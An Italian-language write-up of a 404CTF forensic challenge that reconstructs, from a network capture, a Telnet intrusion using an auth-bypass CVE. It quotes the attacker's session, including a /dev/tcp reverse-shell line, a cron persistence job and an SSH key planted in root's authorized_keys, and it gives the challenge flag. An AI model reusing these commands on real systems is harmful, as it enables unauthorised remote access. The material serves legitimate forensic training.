# Exfiltration Kantik [1/3]

**Competizione:** 404CTF 2026 <br>
**Categoria:** Forensic

<img src="exfiltration_kantik1.png">

---

## Soluzione

### Ricognizione

Il file fornito è una cattura di rete (`network_capture.pcap`).

Il primo passo è quello di enumerare tutte le coppie IP presenti nella cattura.
Importiamo il nostro file su Wireshark e usiamo:

**Statistics → Conversations**

<img src = "conversations_ipv4.png">

Dalla tab **IPv4** vediamo tre host in gioco: `.1` (gateway), `.133` e `.177`.

La conversazione dominante è `.133 ↔ .177` con 131.635 pacchetti e 8 MB di traffico, chiaramente la sessione principale dell'attacco. Notiamo inoltre che è `.133` ad iniziare (Packets A→B = 65.803), il che lo identifica come l'attaccante.

<img src="conversations_udp.png">

Dalla tab **UDP** emergono esclusivamente query DNS generate dalla vittima `.177` verso il gateway `.1` sulla porta 53. Non compare alcun traffico anomalo. L’intero attacco si svolge infatti sul protocollo TCP.

A questo punto abbiamo già identificato con chiarezza i due endpoint coinvolti:

- **IP attaccante:** `192.168.122.133`
- **IP vittima:** `192.168.122.177`

<img src="conversations_tcp.png">

La tab **TCP** ci fornisce il quadro completo dell'attacco. Lo screen mostra una visione parziale, in realtà l'attaccante ha scansionato tutte le porte dalla 1 fino alla 65535 con nmap (visibili le migliaia di conversazioni da 2 pacchetti su porta 58292, classico pattern SYN scan). Le porte che ci interessano sono:

- **Porta 22**: `.133 → .177`, nmap rileva SSH aperto, seguita da tentativi di accesso
- **Porta 23**: numerose connessioni `.133 → .177`, la fase di exploit Telnet, dove l'attaccante ottiene la shell root
- **Porta 80**: `.133 → .177`, scansione web


### Versione Apache e ruolo degli IP

Su Wireshark, filtrando con `http.server contains "Apache"`

<img src="apache.png">

Otteniamo 9 pacchetti, tutte risposte HTTP dalla vittima `.177` verso l'attaccante `.133`. Cliccando sul primo ed espandendo `Hypertext Transfer Protocol` nel pannello in fondo a sinistra, troviamo subito la versione nel campo `Server:`:

- **Versione Apache:** `2.4.66`
- **IP vittima:** `192.168.122.177`

Filtriamo con `telnet` e seguiamo il flusso con **Follow → TCP Stream**.

<img src="ch4ton.png">

Nell' output della sessione appare subito l'hostname della macchina:

```
Linux 6.1.0-44-amd64 (ch4ton) (pts/0)
```
**Hostname vittima:** `ch4ton`

Filtrando con `http.request.uri contains "nmap"`:

<img src="nmap.png">

Otteniamo 2 pacchetti: la richiesta e la risposta 404. Espandendo
`Hypertext Transfer Protocol` nel pannello in fondo a sinistra vediamo:

- lo User-Agent che tradisce immediatamente, lo strumento usato è **nmap**.
- Il campo `Host` conferma l’hostname della vittima, sempre riportato come `ch4ton`.

### Identificazione del vettore di accesso iniziale

Analizzando il traffico generato dall’attaccante verso la vittima, emerge chiaramente una connessione diretta alla **porta 23 (Telnet)**. Riprendiamo quindi il flusso dell’attacco e osserviamo l’intera sessione per ricostruire con precisione ciò che è avvenuto:

```
..%..&..&........... ..!.."..'...
..%..&..... ..#..'..$..%..%.........&..&...........!..".."........
..%..&.....#..$
.. .....'.........
..%...........*....".....b........b....	B.
........
........................"...... .38400,38400....'..USER.-f root......XTERM-256COLOR..
...
...
........!......"
........"
..".............	..
........
.............
Linux 6.1.0-44-amd64 (ch4ton) (pts/0)


uname -a

uname -a
Linux ch4ton 6.1.0-44-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.164-1 (2026-03-09) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Apr 30 06:50:04 EDT 2026 on tty1

whoami

whoami

id

id
.[?2004hroot@ch4ton:~# uname -a
.[?2004l
.
cat /etc/passwd | grep /home

cat /etc/passwd | grep /home
Linux ch4ton 6.1.0-44-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.164-1 (2026-03-09) x86_64 GNU/Linux

w

.[?2004hroot@ch4ton:~# whoami
.[?2004l
.
echo '#!/bin/bash' > /opt/.system_update

w
echo '#!/bin/bash' > /opt/.system_update
root
.[?2004hroot@ch4ton:~# id
.[?2004l
.uid=0(root) gid=0(root) groups=0(root)
.[?2004hroot@ch4ton:~# cat /etc/passwd | grep /home
.[?2004l
.labo:x:1000:1000:labo,,,:/home/labo:/bin/bash
rcap:x:1001:1001:Cap Ricorne - Directeur:/home/rcap:/bin/bash
dmegame:x:1002:1002:Megame Diocre - Chercheur:/home/dmegame:/bin/bash
ppoguri:x:1003:1003:Poguri Poste - PhD Student:/home/ppoguri:/bin/bash
ningeais:x:1004:1004:Ingeais Nier - Sysadmin:/home/ningeais:/bin/bash
tkant:x:1005:1005:Kant Tique - Post-doc:/home/tkant:/bin/bash
.[?2004hroot@ch4ton:~# w
.[?2004l
. 06:51:54 up 13 min,  2 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty1     -                06:50    1:36   0.13s  0.01s -bash
root     pts/0    ch4t             06:51    0.00s  0.03s  0.01s w
.[?2004hroot@ch4ton:~# echo '#!/bin/bash' > /opt/.system_update
.[?2004l
..[?2004hroot@ch4ton:~#
echo 'bash -i >& /dev/tcp/192.168.122.133/4444 0>&1' >> /opt/.system_update

echo 'bash -i >& /dev/tcp/192.168.122.133/4444 0>&1' >> /opt/.system_update
.[?2004l
.
chmod +x /opt/.system_update
(crontab -l 2>/dev/null; echo '*/5 * * * * /opt/.system_update') | crontab -
crontab -l
mkdir -p /root/.ssh
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl8fmPvF2R3R8MEYo3Hw3Jh1U4PFCXNtVhyMRDwtIDpzAqeSNpo4KLry8EjxSOOCiCCxn2ndJ0lTmbVP93R1zVnJjntw5ND3LROlmzXri+7pAbMTuLdTrArvR5ib3WJj/5SSGoGLDI8tuInMv9tPCN0aWw0uu9GoQ15cGZMq1/lEOc95M/9ixpDFCtxOTmrvn0Nivey76IeweR0+jBpxsooROIt1/hQ/XJ29m47xXd+8pkVCmx9XekDm7HoZzfmQZvefReMk5fn/qeOUQ8p+7IYqDyKuEbVPwrCVcf3D3Qc3qFDtyauDaJcFGe3EWXiVRFudpGuzgJJMYe618/cw1X root@ch4t' >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh

.[?2004hroot@ch4ton:~#
chmod 600 /root/.ssh/authorized_keys

chmod +x /opt/.system_update
.[?2004l
.chmod 600 /root/.ssh/authorized_keys
.[?2004hroot@ch4ton:~# (crontab -l 2>/dev/null; echo '*/5 * * * * /opt/.system_update') | crontab -
.[?2004l
..[?2004hroot@ch4ton:~# crontab -l
.[?2004l
.0 2 * * * /usr/bin/backup_research_data.sh
*/30 * * * * /usr/bin/sync_experimental_data.sh
*/5 * * * * /opt/.system_update
.[?2004hroot@ch4ton:~# mkdir -p /root/.ssh
.[?2004l
..[?2004hroot@ch4ton:~# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl8fmPvF2R3R8MEYo3Hw3Jh1U4PFCXNtVhyMRDwtIDpzAqeSNpo4KLry8EjxSOOCiCCxn2ndJ0lTmbVP93R1zVnJjntw5ND3LROlmzXri+7pAbMTuLdTrArvR5ib3WJj/5SSGoGLDI8tuInMv9tPCN0aWw0uu9GoQ15cGZMq1/lEOc95M/9ixpDFCtxOTmrvn0Nivey76IeweR0+jBpxsooROIt1/hQ/XJ29m47xXd+8pkVCmx9XekDm7HoZzfmQZvefReMk5fn/qeOUQ8p+7IYqDyKuEbVPwrCVcf3D3Qc3qFDtyauDaJcFGe3EWXiVRFudpGuzgJJMYe618/cw1X root@ch4t' >> /root/.ssh/authorized_keys
.[?2004l
..[?2004hroot@ch4ton:~# chmod 700 /root/.ssh
.[?2004l
..[?2004hroot@ch4ton:~# chmod 600 /root/.ssh/authorized_keys
.[?2004l
..[?2004hroot@ch4ton:~#
exit

exit
.[?2004l
.logout
```

L'attaccante ha impostato la variabile `USER` al valore `-f root`. Il daemon telnetd di GNU Inetutils non sanifica questa variabile prima di passarla a `/bin/login`, che interpreta `-f` come "force login senza autenticazione". Il risultato è che il server risponde immediatamente con una shell root, senza mai chiedere la password:

```
Linux 6.1.0-44-amd64 (ch4ton) (pts/0)
Last login: Thu Apr 30 06:50:04 EDT 2026 on tty1
```
Siamo già dentro come root, questo è esattamente il meccanismo descritto nella **CVE-2026-24061** (CVSS 9.8 Critical):
> https://www.cve.org/CVERecord?id=CVE-2026-24061

Tra le references troviamo anche il commit di fix su Codeberg, che mostra come gli sviluppatori hanno risolto il problema.

> https://codeberg.org/inetutils/inetutils/commit/fd702c02497b2f398e739e3119bed0b23dd7aa7b

<img src="bug_correction.png">

La correzione introduce un controllo che scarta qualsiasi valore della variabile USER che inizi con - oppure contenga metacaratteri della shell; in questi casi il valore viene ignorato e sostituito con una stringa vuota.

L'attaccante, ora root, esegue una rapida ricognizione:

```
whoami   → root
id       → uid=0(root) gid=0(root) groups=0(root)
uname -a → Linux ch4ton 6.1.0-44-amd64 #1 SMP PREEMPT_DYNAMIC Debian
           6.1.164-1 (2026-03-09) x86_64
```

Con `cat /etc/passwd | grep /home` enumera gli utenti del sistema, sei account di ricercatori: `labo`, `rcap` (Directeur), `dmegame` (Chercheur), `ppoguri` (PhD Student), `ningeais` (Sysadmin), `tkant` (Post-doc).

Con `w` verifica le sessioni attive e scopre di essere l'unico connesso da remoto (`pts/0`).

A questo punto installa la persistenza. Prima il reverse shell:

```bash
echo '#!/bin/bash' > /opt/.system_update
echo 'bash -i >& /dev/tcp/192.168.122.133/4444 0>&1' >> /opt/.system_update
chmod +x /opt/.system_update
(crontab -l 2>/dev/null; echo '*/5 * * * * /opt/.system_update') | crontab -
```
Lo script `/opt/.system_update` apre una **reverse bash shell** verso l’host `192.168.122.133` sulla **porta 4444**. Inserendolo nel crontab con la regola `*/5 * * * *`, l’attaccante ne garantisce l’esecuzione ogni 5 minuti, mantenendo così un accesso ricorrente anche nel caso in cui la sessione Telnet venga chiusa.

Il comando `crontab -l` ci conferma l’avvenuta modifica. Accanto ai job legittimi già presenti compare infatti la nuova entry malevola:

```
0 2 * * *    /usr/bin/backup_research_data.sh
*/30 * * * * /usr/bin/sync_experimental_data.sh
*/5 * * * *  /opt/.system_update        ← aggiunto dall'attaccante
```

Successivamente, l’attaccante aggiunge una chiave SSH pubblica all’interno di `/root/.ssh/authorized_keys` (`root@ch4t`), ottenendo così un canale di accesso alternativo e permanente, completamente indipendente dal servizio Telnet compromesso.

Infine, la sessione si chiude con un semplice `exit`, ma ormai il gioco è fatto e quel punto di persistenza è già pienamente operativo. Poco dopo, il server compromesso effettuerà una richiesta POST verso `192.168.122.133:8080/upload`, inviando dati cifrati all’host dell’attaccante.

<img src="upload.png">

---

## Flag

```
404CTF{192.168.122.133_192.168.122.177_2.4.66_CVE-2026-24061_4444}
```